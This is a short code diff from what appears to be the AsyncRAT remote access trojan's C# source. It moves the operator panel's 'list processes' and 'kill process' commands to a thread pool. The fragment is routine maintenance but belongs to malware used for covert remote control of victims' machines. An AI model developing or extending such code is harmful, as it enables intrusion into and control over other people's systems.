@@ -5,6 +5,7 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using AsyncRAT_Sharp.MessagePack;
@@ -39,7 +40,7 @@ namespace AsyncRAT_Sharp.Forms
                         msgpack.ForcePathObject("Packet").AsString = "processManager";
                         msgpack.ForcePathObject("Option").AsString = "Kill";
                         msgpack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
-                        C.BeginSend(msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                     });
                 }
             }
@@ -52,7 +53,7 @@ namespace AsyncRAT_Sharp.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "processManager";
                 msgpack.ForcePathObject("Option").AsString = "List";
-                C.BeginSend(msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
             });
         }
     }
